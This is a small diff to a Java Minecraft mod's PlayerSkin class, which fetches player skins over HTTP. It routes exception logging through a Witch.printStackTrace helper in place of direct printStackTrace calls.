@@ -3,6 +3,7 @@ package me.soda.witch.features;
 import com.google.gson.Gson;
 import com.google.gson.JsonArray;
 import com.google.gson.JsonObject;
+import me.soda.witch.Witch;
 import net.minecraft.client.texture.NativeImage;
 import net.minecraft.client.util.DefaultSkinHelper;
 import org.apache.commons.codec.binary.Base64;
@@ -67,7 +68,7 @@ public class PlayerSkin {
             try {
                 this.builder = HttpRequest.newBuilder().uri(new URI(url)).header("User-Agent", "Java");
             } catch (URISyntaxException e) {
-                e.printStackTrace();
+                Witch.printStackTrace(e);
             }
         }
 
@@ -79,7 +80,7 @@ public class PlayerSkin {
                 var res = HttpClient.newHttpClient().send(builder.build(), responseBodyHandler);
                 return res.statusCode() == 200 ? res.body() : null;
             } catch (IOException | InterruptedException e) {
-                e.printStackTrace();
+                Witch.printStackTrace(e);
                 return null;
             }
         }
